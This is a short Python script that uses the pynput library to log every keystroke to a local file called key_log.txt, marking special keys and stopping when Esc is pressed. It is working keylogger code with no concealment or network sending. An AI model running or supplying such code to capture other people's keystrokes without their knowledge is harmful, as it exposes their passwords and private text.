from pynput import keyboard
import os

def on_press(key):
    try:
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("key_log.txt", "a") as log_file:
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            elif key == keyboard.Key.backspace:
                log_file.write("<BACKSPACE>")
            else:
                log_file.write(f"<{key.name.upper()}>")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Example usage
if __name__ == "__main__":
    # Ensure log file is created/cleared
    with open("key_log.txt", "w") as log_file:
        log_file.write("Keylog started:\n")

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
